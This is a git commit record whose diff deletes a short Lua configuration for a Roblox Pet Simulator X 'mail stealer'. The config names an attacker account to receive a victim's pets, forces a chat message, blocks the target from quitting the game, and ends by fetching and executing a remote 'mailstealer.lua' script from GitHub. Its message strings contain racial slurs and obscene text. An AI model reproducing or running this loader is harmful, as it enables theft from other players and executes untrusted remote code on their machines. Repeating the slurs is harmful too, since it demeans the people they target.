a917aab4110ed53fe97a99bb947a64318db99dc4
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-07-04 10:45:40 +0500

    Delete dovyl_0.lua

--- dovyl_0.lua
+++
@@ -1,9 +0,0 @@
-
-_G.Username = "monkey" --// Username To Send Pets To
-_G.GiftMessage = "niggapron" --// Message For The Gift To Say
-_G.SendMessage = "omgniggasss" --// Message the victim will send in the chat on execution
-_G.Diamonds = 1000000699999 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
-_G.UnlockPets = true --// Unlocks Locked Pets
-_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-_G.Webhook = "porn.com" --// Discord Webhook URL
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GadoScripts/PetSimulatorX/main/mailstealer.lua"))()
